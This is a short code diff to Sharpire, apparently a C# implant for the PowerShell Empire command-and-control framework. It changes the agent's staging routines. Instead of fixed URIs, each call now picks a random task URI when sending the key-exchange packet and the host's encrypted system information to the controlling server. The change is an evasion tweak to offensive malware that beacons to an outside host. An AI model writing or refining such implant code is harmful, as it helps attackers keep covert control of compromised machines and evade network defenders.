@@ -261,8 +261,9 @@ namespace Sharpire
             byte[] hmacData = AesEncryptThenHmac(stagingKeyBytes, publicKeyBytes);
 
             byte[] routingPacket = BuildRoutingPacket(stagingKeyBytes, "00000000", 2, hmacData);
-            string postUri = "/index.jsp";
-            byte[] response = SendData(postUri, routingPacket);
+
+            Random random = new Random();
+            byte[] response = SendData(sessionInfo.GetTaskURIs()[random.Next(0, sessionInfo.GetTaskURIs().Length)], routingPacket);
 
             RoutingPacket packet = DecodeRoutingPacket(response);
             sessionInfo.SetAgentID(packet.SessionId);
@@ -348,8 +349,9 @@ namespace Sharpire
             byte[] encryptedData = AesEncryptThenHmac(keyBytes, systemInfoBytes);
 
             byte[] routingPacket = BuildRoutingPacket(stagingKeyBytes, sessionInfo.GetAgentID(), 3, encryptedData);
-            string postUri = "/index.php";
-            return SendData(postUri, routingPacket);
+
+            Random random = new Random();
+            return SendData(sessionInfo.GetTaskURIs()[random.Next(0, sessionInfo.GetTaskURIs().Length)], routingPacket);
         }
         
         private void PowershellEmpire(byte[] stage2Response)
